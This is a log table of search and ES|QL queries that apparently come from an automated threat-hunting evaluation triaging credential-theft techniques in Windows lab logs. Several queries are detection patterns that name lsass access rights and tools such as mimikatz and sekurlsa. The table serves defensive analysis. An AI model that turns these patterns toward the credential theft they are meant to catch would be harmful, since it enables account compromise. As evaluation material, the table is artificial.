| q-d65ffd9ffd | triage T1056 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000 OR win.GrantedAccess:0x1400… | 33 |  |
| q-1c2ed15299 | triage T1056 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 10 AND win.TargetImage LIKE \"*lsass*\" \| STATS cnt = COUNT(*) BY win.SourceImage, win.GrantedAccess, host.name \| SORT cnt DESC"} | ERROR |  |
| q-5fd6257508 | triage T1056 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None | F09 |
| q-4e05fff09b | triage T1056 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" \| STATS cnt = COUNT(*) BY win.SourceImage, win.GrantedAccess, host.name \| SORT cnt DESC"} | 18 |  |
| q-6db8a5ee23 | triage T1056 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"scranton.dmevals.local\" AND (@timestamp >= \"2020-05-02T03:04:00.000Z\" AND @timestamp <= \"2020-05-02T03:07:00.000Z\") \| KEEP @timestamp, event.code, process.pid, u… | 415 |  |
| q-4e4b56d9c0 | triage T1056 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-e83c357e74 | triage T1056 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (@timestamp >= \"2020-05-02T03:04:30.000Z\" AND @timestamp <= \"2020-05-02T03:06:30.000Z\") \| KEEP @timestamp, host.name, process.pid, user.name, win.Scri… | 18 |  |
| q-7f228583c0 | triage T1056 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*credential*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*keylog*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*hook*\" OR… | 5 |  |
| q-d2bbe0f9ec | triage T1056 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE win.ScriptBlockId == \"b91c2ae7-3a03-49df-8d2a-4c42fc79df56\" OR win.ScriptBlockId == \"0365cb7f-22ef-47e4-ad96-230ddc962939\" OR win.ScriptBlockId == \"9d153741-75c3-4062-afe3-aeca0… | 3 |  |
| q-1eec866a58 | triage T1056 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"scranton.dmevals.local\" AND (process.pid == 2976 OR process.pid == 3852 OR process.pid == 3876 OR process.pid == 3544) \| KEEP @timestamp, process… | 5 |  |
| q-616c064cf4 | triage T1056 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.pid == 2976 AND host.name == \"scranton.dmevals.local\" \| KEEP @timestamp, host.name, process.pid, process.executable, process.command_line, process.pare… | 1 |  |
| q-84326f7d30 | triage T1056 step 6 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-765d210fc9 | triage T1056 step 7 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None | F09, F11 |
| q-350d6f3161 | triage T1056 step 7 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE win.ScriptBlockId == \"b91c2ae7-3a03-49df-8d2a-4c42fc79df56\" \| KEEP @timestamp, host.name, process.pid, user.name, win.ScriptBlockId, win.ScriptBlockText, win.Message"} | 1 |  |
| q-3f3ff84013 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | ERROR |  |
| q-23788a215f | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | ERROR |  |
| q-04b9fbb84a | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | ERROR |  |
| q-2c81670276 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | ERROR |  |
| q-7f200d2228 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-6a27244183 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-f885897448 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-649c4b68e2 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-457d710258 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-4b6bf73989 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoWbcdc"} | None |  |
| q-611dd9d05c | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoWbcdc"} | None |  |
| q-84234b317d | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-a02adf642e | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | ERROR |  |
| q-ace9309bea | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | ERROR |  |
| q-8323f344e3 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | ERROR |  |
| q-05348b5a3b | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-6c6116ab50 | triage T1056 step 9 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE win.ScriptBlockId == \"b91c2ae7-3a03-49df-8d2a-4c42fc79df56\" OR win.ScriptBlockId == \"9d153741-75c3-4062-afe3-aeca0aee611b\" OR win.ScriptBlockId == \"08718796-b72d-4e05-a41f-d7c05… | 4 | F08, F12 |
| q-f501b7cb93 | triage T1056 step 9 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.pid == 2976 AND host.name == \"scranton.dmevals.local\" \| KEEP @timestamp, host.name, process.pid, process.executable, process.command_line, process.pare… | 1 | F12 |
| q-131afa7b02 | triage T1110 step 1 | count | {"dataset": "windows.security", "query": "event.code:4625 OR event.code:4771 OR event.code:4776 OR event.code:4740", "time_from": null, "time_to": null} | 1 |  |
| q-5ec8b8ece0 | triage T1110 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 30, "sub_field": "win.GrantedAccess"} | 326 |  |
| q-47580e9e25 | triage T1110 step 1 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 30, "sub_field": "win.LogonType"} | 297 |  |
| q-ce78fca16f | triage T1110 step 2 | search | {"dataset": "windows.security", "query": "event.code:4625 OR event.code:4771 OR event.code:4776 OR event.code:4740", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process… | 1 | F13 |
| q-c914a68e40 | triage T1110 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND process.executable:*PowerShell*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "process.command_line", "win.GrantedAccess",… | 4 |  |
| q-8e793eb4fd | triage T1110 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-edc012aa09 | triage T1110 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-8fb8d8249b | triage T1110 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND @timestamp >= \"2020-05-02T03:00:00.000Z\" AND @timestamp <= \"2020-05-02T03:10:00.000Z\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockId, win.… | 20 |  |
| q-6bff288f02 | triage T1110 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*sekurlsa*\" O… | 7 |  |
| q-1b2f116174 | triage T1110 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4663\" AND win.ObjectName == \"SAM\" \| KEEP @timestamp, host.name, user.name, win.ObjectName, win.ProcessName, win.AccessMask, win.AccessList, _id, _index \| LIMIT 15"… | 0 |  |
| q-4c4ba3127d | triage T1110 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None | F15 |
| q-47baf20d9e | triage T1110 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE win.ObjectName == \"SAM\" \| KEEP @timestamp, host.name, user.name, event.code, win.ObjectName, win.ProcessName, win.AccessMask, win.AccessList, _id, _index \| LIMIT 15"} | 10 | F15 |
| q-2756ba30d1 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-082a21d5c5 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-750b5ceafa | triage T1110 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0P"} | None |  |
| q-636536d16d | triage T1110 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdLx28"} | None |  |
| q-8ebb0feafa | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuiuXgG"} | None |  |
| q-46dc8edafb | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuiuXgG"} | None |  |
| q-4b3b8ae4a2 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-5b8f3f2f75 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-64b3281863 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-a5a3e2effa | triage T1110 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0i"} | None |  |
| q-e83b71dd7e | triage T1110 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-7a45ab1e8e | triage T1110 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdLx3n"} | None |  |
| q-1622a155d4 | triage T1111 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None | F18 |
| q-f808601f79 | triage T1111 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppFX"} | None | F18 |
| q-5c71b4d09f | triage T1111 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass.exe", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-020d91fd5b | triage T1111 step 1 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4648", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 15 |  |
| q-8e048ebc7b | triage T1111 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass.exe AND (process.executable:*powershell.exe OR process.executable:*wsmprovhost.exe OR process.executable:*wininit.exe OR process.executable:*csrss.exe OR process.executable:*servi… | 7 |  |
| q-64d2e28fa8 | triage T1111 step 2 | search | {"dataset": "windows.security", "query": "event.code:4624 AND win.LogonType:10", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.TargetUserName", "win.IpAddress", "win.Workstation", "win.AuthenticationPackageName"], "size": 10, "… | 2 | F18 |
| q-e4e70d3499 | triage T1111 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None | F18 |
| q-519341a39b | triage T1111 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None | F18 |
| q-f53b11d0e4 | triage T1111 step 3 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND user.name:pbeesly", "time_from": null, "time_to": null, "size": 30, "sub_field": "host.name"} | 141 |  |
| q-5d26868dca | triage T1111 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND user.name:pbeesly AND (process.executable:*powershell.exe OR process.executable:*csc.exe OR process.executable:*PsExec64.exe OR process.executable:*sdelete64.exe OR process.executable:*accessChk.exe OR p… | 31 | F18 |
| q-40a0202a63 | triage T1111 step 4 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*Credential* OR win.ScriptBlockText:*token* OR win.ScriptBlockText:*MFA* OR win.ScriptBlockText:*smartcard*)", "time_from": null, "time_to": nul… | 4 | F18 |
| q-36ff28ad71 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-40dbc147e5 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppFX"} | None |  |
| q-255905dc86 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppFY"} | None |  |
| q-33e8d6b4d2 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnfdUsq"} | None |  |
| q-561a7e732d | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnQM1oU"} | None |  |
| q-8f57a6746f | triage T1111 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-90691795a4 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-b1275e0cf2 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None |  |
| q-5a9a346f5f | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1KRR"} | None |  |
| q-d376f6697a | triage T1111 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-b734719d00 | triage T1187 step 1 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"http\" AND http.request.method IN (\"PROPFIND\",\"MOVE\",\"OPTIONS\") \| KEEP @timestamp, source.ip, destination.ip, destination.port, http.request.method, url.original, url.doma… | 36 |  |
| q-17d96b4fb6 | triage T1187 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 3 AND (destination.port == 445 OR destination.port == 139) \| KEEP @timestamp, host.name, process.executable, user.name, source.ip, destination.ip, destination.port, win.In… | ERROR |  |
| q-66960870e7 | triage T1187 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND (destination.port == \"445\" OR destination.port == \"139\") \| KEEP @timestamp, host.name, process.executable, user.name, source.ip, destination.ip, destination.… | ERROR |  |
| q-10badf658d | triage T1187 step 2 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND (destination.ip == \"192.168.0.4\" OR source.ip == \"192.168.0.4\") \| KEEP @timestamp, source.ip, source.port, destination.ip, destination.port, zeek.service, zeek.du… | 60 | F19 |
| q-1537ab6b8f | triage T1187 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND (destination.port == 445 OR destination.port == 139) \| KEEP @timestamp, host.name, process.executable, user.name, source.ip, destination.ip, destination.port, wi… | 66 | F20 |
| q-0f7957ae61 | triage T1187 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" \| KEEP @timestamp, host.name, user.name, process.executable, process.command_line, process.parent.executable, _id, _index \| SORT @timestamp ASC \| LIMIT 60"} | 60 | F19 |
| q-12a7ef1b3a | triage T1187 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*webdav*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*\\\\\\\\192.168*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*net u… | 2 |  |
| q-3e24863faf | triage T1187 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" AND win.LogonType IN (\"3\",\"9\") \| KEEP @timestamp, host.name, user.name, win.TargetUserName, win.LogonType, win.IpAddress, win.Workstation, win.Authenticatio… | 60 |  |
| q-1a3e5e1e45 | triage T1187 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None | F19 |
| q-437803aeb3 | triage T1187 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaboE"} | None | F19 |
| q-bc2841d581 | triage T1187 step 6 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"http\" AND destination.ip == \"192.168.0.4\" \| KEEP @timestamp, source.ip, http.request.method, url.original, user_agent.original, zeek.status_code, zeek.username, zeek.request_… | ERROR |  |
| q-c03255f287 | triage T1187 step 6 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"5145\" OR event.code == \"5140\" \| KEEP @timestamp, host.name, user.name, win.ShareName, win.ShareLocalPath, win.RelativeTargetName, win.IpAddress, win.SourceAddress, … | 60 | F20 |
| q-0731b71a17 | triage T1187 step 7 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"http\" AND destination.ip == \"192.168.0.4\" \| KEEP @timestamp, source.ip, http.request.method, url.original, user_agent.original, zeek.status_code, zeek.request_body_len, zeek.… | 60 | F19 |
| q-2e607232d9 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-92b2146de0 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-8712f7591f | triage T1187 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-700133da80 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-c7453f4bb9 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-fa60b8f4b5 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaboE"} | None |  |
| q-36901b3b6d | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1KRR"} | None |  |
| q-5c931da66b | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBov08Fg"} | None |  |
| q-3277a1e39f | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR9H"} | None |  |
| q-ca134104e6 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR9H"} | None |  |
| q-d0e08cf0c0 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8V"} | None |  |
| q-6802c81405 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8V"} | None |  |
| q-b84176774a | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR85"} | None |  |
| q-c3bc6a4415 | triage T1187 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR_2"} | None |  |
| q-bcc747dd2a | triage T1187 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8KXgx"} | None |  |
| q-469367233b | triage T1187 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8KXgx"} | None |  |
| q-f44be07d2c | triage T1187 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fR"} | None |  |
| q-56dc14deac | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBouzOll"} | None |  |
| q-1ba70a8db7 | triage T1187 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBouzOll"} | None |  |
| q-aeb30b4948 | triage T1212 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 10 AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" \| STATS c = COUNT(*) BY process.executable, win.GrantedAccess, host.name \| SORT c ASC \| LIMIT 50"} | ERROR |  |
| q-bb91cec0e0 | triage T1212 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 10 \| STATS c = COUNT(*) BY process.executable, win.GrantedAccess \| SORT c ASC \| LIMIT 40"} | ERROR |  |
| q-40a6ed4c56 | triage T1212 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" \| STATS c = COUNT(*) BY process.executable, win.GrantedAccess, host.name \| SORT c ASC \| LIMIT 50"} | 18 |  |
| q-9aa8b0d923 | triage T1212 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" \| STATS c = COUNT(*) BY process.executable, win.GrantedAccess \| SORT c ASC \| LIMIT 40"} | 40 |  |
| q-e9877888c1 | triage T1212 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" AND (win.GrantedAccess == \"0x1fffff\" OR win.GrantedAccess == \"0x1f3fff\" OR win.GrantedAccess == \"0x101001\") \| K… | 7 | F22 |
| q-147cb7d956 | triage T1212 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| STATS c = COUNT(*) BY host.name, user.name \| SORT c ASC \| LIMIT 20"} | 3 |  |
| q-ac75e1e1eb | triage T1212 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None | F21 |
| q-f87f904d5f | triage T1212 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" \| KEEP @timestamp, user.name, win.ScriptBlockId, win.ScriptBlockText, _id, _index \| SORT @timestamp ASC \| LIMIT … | 30 |  |
| q-076f1309c3 | triage T1212 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:03:00.000Z\" AND @timestamp <= \"2020-05-02T03:08:00.000Z\" \| KEEP @timestamp, event.code, user.name, win.S… | 40 |  |
| q-59ef12ea6c | triage T1212 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*procdump*\" OR TO_LOWER(process.command_line) LIKE \"*lsass*\" OR TO_LOWER(process.command_line) LIKE \"*minidump*\" OR TO… | 1 |  |
| q-c451bb6996 | triage T1212 step 6 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:04:30.000Z\" AND @timestamp <= \"2020-05-02T03:10:00.000Z\" AND event.code == \"4104\" \| KEEP @timestamp, u… | 40 | F21 |
| q-399e72f8a1 | triage T1212 step 6 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:00:00.000Z\" AND @timestamp <= \"2020-05-02T03:12:00.000Z\" \| KEEP @timestamp, use… | 40 | F21 |
| q-b81286f02e | triage T1212 step 7 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None | F21 |
| q-8a6a28e32d | triage T1212 step 7 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*mimikatz*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*safetykatz*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*sekurlsa*\" OR TO_LOWER(win.ScriptBl… | 5 | F21 |
| q-177f29dd2a | triage T1212 step 8 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None | F21 |
| q-84dfccb097 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-11d6881b5e | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-a063e666ac | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-bde5596217 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-c303f1e56e | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-8d97c5bdc5 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-c191343afa | triage T1212 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-4b85e0eab0 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLr6"} | None |  |
